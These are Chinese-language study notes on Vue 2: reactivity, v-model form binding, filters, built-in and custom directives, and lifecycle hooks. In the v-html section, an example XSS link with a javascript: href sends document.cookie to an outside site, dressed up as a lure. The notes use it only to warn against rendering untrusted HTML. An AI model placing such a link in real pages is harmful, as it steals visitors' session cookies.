                        return p.name.indexOf(this.keyWord) !== -1
                    })
                }
            }
        }
        ) 
    </script>
~~~

![image-20230714213317339](../AppData/Roaming/Typora/typora-user-images/image-20230714213317339.png)

数据监视

更新时的一个问题

this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} 更改data数据，Vue不监听，模板不改变

~~~html
<title>更新时的一个问题</title>
<script type="text/javascript" src="../js/vue.js"></script>

<div id="root">
  <h2>人员列表</h2>
  <button @click="updateMei">更新马冬梅的信息</button>
  <ul>
    <li v-for="(p,index) of persons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  const vm = new Vue({
    el: '#root',
    data: {
      persons: [
        { id: '001', name: '马冬梅', age: 30, sex: '女' },
        { id: '002', name: '周冬雨', age: 31, sex: '女' },
        { id: '003', name: '周杰伦', age: 18, sex: '男' },
        { id: '004', name: '温兆伦', age: 19, sex: '男' }
      ]
    },
    methods: {
      updateMei() {
        // this.persons[0].name = '马老师'	//奏效
        // this.persons[0].age = 50				//奏效
        // this.persons[0].sex = '男'			//奏效
        // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
        this.persons.splice(0, 1, { id: '001', name: '马老师', age: 50, sex: '男' })
      }
    }
  })
</script>
~~~

模拟一个数据检测

~~~js
let data = {
  name: '尚硅谷',
  address: '北京',
}

function Observer(obj) {
  // 汇总对象中所有的属性形成一个数组
  const keys = Object.keys(obj)
  // 遍历
  keys.forEach((k) => {
    Object.defineProperty(this, k, {
      get() {
        return obj[k]
      },
      set(val) {
        console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
        obj[k] = val
      }
    })
  })
}

// 创建一个监视的实例对象，用于监视data中属性的变化
const obs = new Observer(data)
console.log(obs)

// 准备一个vm实例对象
let vm = {}
vm._data = data = obs
~~~

原理

 1.  vue会监视data中所有层次的数据

 2.  如和检测对象中的数据？

     通过setter实现监视，且要在new Vue()时就传入要检测的数据

     - 对象创建后追加的属性，vue默认不做响应式处理

     - 如需给后添加的属性做响应式，请使用如下api

       Vue.set(target,propertyName/index,value)

       vm.$set(target,propertyName/index,value)

 3.  如何检测数组中的数据

     通过包裹数组更新元素的方法实现，本质就是做了两件事情

     - 调用原生对应的方法对数组进行更新
     - 重新解析模板，进而更新页面

 4.  在vue修改数组中的某个元素一定要用如下方法

     ==push()====pop()====unshift()====shift()====splice()====sort()====reverse()==这几个方法被Vue重写了
     Vue.set()或vm.$set()

特别注意：Vue.set() 和 vm.$set() 不能给vm或vm的根数据对象（data等）添加属性

​    

~~~html
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄+1岁</button> <br />
        <button @click="addSex">添加性别属性，默认值：男</button> <br />
        <button @click="student.sex = '未知' ">修改性别</button> <br />
        <button @click="addFriend">在列表首位添加一个朋友</button> <br />
        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
        <button @click="addHobby">添加一个爱好</button> <br />
        <button @click="updateHobby">修改第一个爱好为：开车</button> <br />
        <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />
        <h3>姓名：{{ student.name }}</h3>
        <h3>年龄：{{ student.age }}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">{{ h }} </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">{{ f.name }}--{{ f.age }}</li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                student: {
                    name: 'tom',
                    age: 18,
                    hobby: ['抽烟', '喝酒', '烫头'],
                    friends: [
                        { name: 'jerry', age: 35 },
                        { name: 'tony', age: 36 }
                    ]
                }
            },
            methods: {
                addSex() {
                    this.$set(this.student, 'sex', '男')
                },
                addFriend() {
                    this.student.friends.unshift({ name: 'jack', age: 70 })
                },
                updateFirstFriendName() {
                    this.student.friends[0].name = '张三'
                },
                addHobby() {
                    this.student.hobby.push('学习')
                },
                updateHobby() {
                    this.$set(this.student.hobby, 0, '开车')
                },
                removeSmoke() {
                    this.student.hobby = this.student.hobby.filter((h) => {
                        return h !== '抽烟'
                    })
                }
            }
        }
        ) 
    </script>
~~~

# 收集表单数据 过滤器

## 收集表单数据

- 若<input type="text"/>  则==v-model==收集的是==value==值，用户输入的内容就是value值
- 若<input type="radio"/> 则==v-model==收集的是==value==值，且要给标签配置value属性
- 若<input type="checkbox"/> 
  - 没配置==value==属性，那么收集的是==checked==属性（勾选or未勾选，是布尔值）
  - 配置了==value==属性
    - ==v-model==的初始值是非数组，那么收集的就是==checked==属性
    - ==v-model==初始值是数组，那么收集的就是==value==组成的数组

a .lazy 失去焦点

b. number 输入字符串转为有效的数字

c. trim 输入的字符串去掉首尾空格过滤

~~~html
<title>收集表单数据</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <form @submit.prevent="demo">
            账号：<input type="text" v-model.trim="userInfo.account"> <br><br>
            密码：<input type="password" v-model="userInfo.password"> <br><br>
            年龄：<input type="number" v-model.number="userInfo.age"> <br><br>
            性别：
            男<input type="radio" v-model="userInfo.sex" value="male">
            女<input type="radio" v-model="userInfo.sex" value="female"> <br><br>
            爱好：
            学习<input type="checkbox" v-model="userInfo.hobby" value="study">
            打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
            <br><br>
            所属校区：
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
            </select>
            <br><br>
            其他信息：
            <textarea v-model.lazy="userInfo.other"></textarea><br><br>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受
            <a href="https://www.yuque.com/cessstudy">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                userInfo: {
                    account: '',
                    password: '',
                    age: 18,
                    sex: 'female',
                    hobby: [],
                    city: 'beijing',
                    other: '',
                    agree: ''
                }
            },
            methods: {
                demo() {
                    console.log(JSON.stringify(this.userInfo))
                }
            }
        }
        ) 
    </script>
~~~



![image-20230715095923074](../AppData/Roaming/Typora/typora-user-images/image-20230715095923074.png)

## 过滤器(Vue3以及移除)

定义：对咬现实的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)

注册过滤器：

​	Vue.filter(name,callback) 全局过滤器

​	new Vue{{filters：{}}} 局部过滤器

使用过滤器{{xxx|过滤器名}} 或v-bind:属性 = “xxx|属性名”

备注：

1. 过滤器可以接受额外参数，多个过滤器也可以串联
2. 并没有改变原本的数据，而是产生新的对应的数据

处理时间的库moment体积较大 dayjs轻量级

~~~html
<body>
    <div id="root">
        <h2>时间</h2>
        <h3>当前时间戳：{{time}}</h3>
        <h3>转换后时间{{time|timeFormater()}}</h3>
        <h3>转换后时间{{time|timeFormater('YYYY-MM-DD HH:mm:ss')}}</h3>
        <h3>截取年月日：{{time | timeFormater() | mySlice}}</h3>
    </div>
    <script>
        Vue.config.productionTip = false
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 11)
        })
        new Vue({
            el: '#root',
            data: {
                time: new Date()
            },
            filters: {
                timeFormater(value, str = "YYYY年MM月DD日 HH:mm:ss") {
                    return dayjs(value).format(str)
                }
            }
        })
    </script>
~~~



![image-20230715101319847](../AppData/Roaming/Typora/typora-user-images/image-20230715101319847.png)

# 内置指令 自定义指令

## 内置指令

之前学过的指令：

​	v-bind 单向绑定

​	v-model 双向绑定

​	v-for 遍历数组、对象、字符串、指定次数

​	v-on 绑定事件，可简写为@

​	v-show 条件渲染

​	v-if 条件渲染

​	v-else-if 条件渲染

​	v-else 条件渲染

### v-text指令

作用：向其所在的节点中渲染文本内容

​	与插值语法的区别：v-text会替换掉节点中的文本内容，{{xxx}}则不会，更加灵活

~~~html
<body>
    <div id="root">
        <div>你好{{name}}</div>
        <div v-text="name"></div>
        <div v-text="str"></div>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                str: '<h3>你好啊</h3>'
            },
        })
    </script>
~~~

![image-20230715101753712](../AppData/Roaming/Typora/typora-user-images/image-20230715101753712.png)

### v-html指令

作用：向指定节点渲染包含html结构的内容

与插值语法的区别

​	v-html会替换掉节点中所有的内容，{{xxx}}则不会

​	v-html可以识别html结构

严重注意v-html有安全性问题

​	在网站上动态渲染任意html都是非常危险的，容易导致xss攻击

​	一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！

~~~html
<body>
    <div id="root">
        <div>你好，{{ name }}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                str: '<h3>你好啊</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
            },
        })
    </script>
~~~

![image-20230715102217100](../AppData/Roaming/Typora/typora-user-images/image-20230715102217100.png)

### v-cloak指令

v-cloak指令(没有值)

​	本质是一个特殊属性，vue实例创建完毕并接管容器后，会删除v-cloak属性

​	使用css配合v-cloak可以解决网速慢页面出现{{xxx}}的问题

~~~html
<body>
    <div id="root">
        <h2 v-cloak>{{ name }}</h2>
    </div>
    <script src="http://localhost:8080/resource/5s/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        console.log(1)
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
            },
        })
    </script>
~~~

### v-once指令

v-once所在节点在初次动态渲染后，就视为静态内容了，

以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

~~~html
<title>v-once指令</title>
</head>

<body>
    <div id="root">
        <h2 v-once>初始化的n值是: {{n}}</h2>
        <h2>当前的n值是: {{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        console.log(1)
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
        })
    </script>
~~~



![image-20230715102919846](../AppData/Roaming/Typora/typora-user-images/image-20230715102919846.png)

### v-pre指令

跳过v-pre所在节点的编译过程

可利用他跳过：没有使用指令语法，没有使用插值语法的节点，会加快编译

~~~html
    <title>v-pre指令</title>
</head>

<body>
    <div id="root">
        <h2 v-pre>Vue其实很简单</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
        })
    </script>
~~~



## 自定义指令

==directives==

**定义语法**

1.局部指令

~~~js
new Vue({
  directives:{
    指令名：配置对象
  }
})
new Vue({
  directives:{
    指令名：回调函数
  }
})
~~~

2.全局指令

~~~js
Vue.directive(指令名，配置对象)
或
Vue.directive(指令名，回调函数)
Vue.directive('fbind',{
  // 指令与元素成功绑定时（一上来）
  bind(element,binding){
    element.value = binding.value// element就是DOM元素，binding就是要绑定的
  },
  // 指令所在元素被插入页面时
  inserted(element,binding){
    element.focus()
  }
  // 指令所在模板重新解析时
  update(element,binding){
  element.value=binding.value
}
})
~~~

配置对象中常用的三个回调函数

​	bind(element,binding) 指令与元素成功绑定时调用

​	inserted(element,binding) 指令所在元素被插入页面时调用

​	update(element,binding) 指令所在模块结构要被重新解析时调用

element就是DOM元素，binding就是要绑定的对象，它包含以下属性：name、value、oldvalue、expression、arg、modifiers

备注：

​	a. 指令定义时不加v- ，但使用时要加v-

​	b.指令名如果是多个单词，要使用kebab-case命名方法，不要用camelCase命名

~~~js
new Vue({
  el:"#root",
  data:{
    n:1
  },
  directives:{
    'big-name'(element,binding){
      element.innerText=binding.value*10
    }
  }
})
~~~

回顾一个DOM 操作

~~~js
<style>.demo{background-color: orange;}</style>

<body>
  <button id="btn">点我创建一个输入框</button>
</body>

<script type="text/javascript" >
  const btn = document.getElementById('btn')
  btn.onclick = ()=>{
    const input = document.createElement('input')

    input.className = 'demo'
    input.value = 99
    input.onclick = ()=>{alert(1)}

    document.body.appendChild(input)

    input.focus()
    input.parentElement.style.backgroundColor = 'skyblue'
  }
</script>
~~~

~~~html
    <title>自定义指令</title>
</head>

<body>
    <div id="root">
        <h2>{{ name }}</h2>
        <h2>当前的n值是：<span v-text="n"></span> </h2>
        <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
        <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
        <button @click="n++">点我n+1</button>
        <hr />
        <input type="text" v-fbind:value="n">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                n: 1
            },
            directives: {
                big(element, binding) {
                    console.log('big', this)
                    element.innerText = binding.value * 10
                },
                fbind: {
                    bind(element, binding) {
                        element.value = binding.value
                    },
                    insterted(element, binding) {
                        element.focus()
                    },
                    update(element, binding) {
                        element.value = binding.value
                    }
                }
            }
        })
    </script>
~~~

![image-20230715104812637](../AppData/Roaming/Typora/typora-user-images/image-20230715104812637.png)

# 生命周期

## 生命周期

- 又叫生命周期回调函数，生命周期函数、生命周期钩子
- 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数
- 生命周期的名字不可更改，但函数的具体内容是程序员根据需求编写的
- 生命周期的this指向vm或组件实例对象

~~~html
<title>引出生命周期</title>
</head>

<body>
    <div id="root">
        <h2 v-if="a">你好啊</h2>
        <h2 :style="{opacity}">看笔记学Vue</h2>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                a: false,
                opacity: 1

            },
            // 🔴Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted
            mounted() {
                console.log('mounted', this)
                setInterval(() => {
                    this.opacity -= 0.01
                    if (this.opacity <= 0) this.opacity = 1
                }, 16);
            },
        })


         // 通过外部的定时器实现（不推荐）
        // setInterval(() => {
        // 		vm.opacity -= 0.01
        // 		if(vm.opacity <= 0) vm.opacity = 1
        // },16)
    </script>
~~~

## 分析生命周期

![生命周期.png](https://cdn.nlark.com/yuque/0/2022/png/1379492/1643297176928-5d5ac765-237c-462d-9188-84935e6c3c69.png?x-oss-process=image%2Fresize%2Cw_1125%2Climit_0)

~~~html
<title>分析生命周期</title>
</head>

<body>
    <div id="root">
        <h2 v-text="n"></h2>
        <h2>当前的n值是：{{ n }}</h2>
        <button @click="add">点我n+1</button>
        <button @click="bye">点我销毁vm</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
            methods: {
                add() {
                    console.log('add')
                    this.n++
                },
                bye() {
                    console.log('bye')
                    this.$destroy()
                }
            },
            watch: {
                n() {
                    console.log('n变了');
                }
            },
            beforeCreate() {
                console.log('beforeCreate')
            },
            created() {
                console.log('created')
            },
            beforeMount() {
                console.log("beforeMount")
            },
            mounted() {
                console.log('mounted');
            },
            beforeUpdate() {
                console.log('beforeUpdate');
            },
            updated() {
                console.log('updated')
            },
            beforeDestroy() {
                console.log('beforeDestroy')
            },
            destroyed() {
                console.log('destroyed')
            }
        })
    </script>
~~~



![image-20230715110506727](../AppData/Roaming/Typora/typora-user-images/image-20230715110506727.png)

## 总结生命周期

常用的生命周期钩子

​	a. mounted 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作

​	b.beforeDestory 清除定时器、解绑自定义事件、取消订阅信息等收尾工作

关于销毁Vue实例

​	a.销毁后借助Vue开发者工具看不到任何信息

​	b.销毁后自定义事件会失效，但是原生DOM事件依然有效

​	c.一般不会再beforeDestory操作数据，因为即使操作数据，也不会再触发更新流程了

~~~html
<title>引出生命周期</title>
</head>

<body>
    <div id="root">
        <h2 :style="{opacity}">欢迎学习Vue</h2>
        <button @click="opacity = 1">透明度设置为1</button>
        <button @click="stop">点我停止变换</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                opacity: 1
            },
            methods: {
                stop() {
                    this.$destroy()
                }
            },
            mounted() {
                console.log('mounted', this)
                this.timer = setInterval(() => {
                    console.log('setInterval')
                    this.opacity -= 0.01
                    if (this.opacity <= 0) this.opacity = 1
                }, 16)
            },
            beforeDestroy() {
                clearInterval(this.timer)
                console.log('vm即将驾鹤西游了')
            },
        })
    </script>
~~~

# 组件化编程

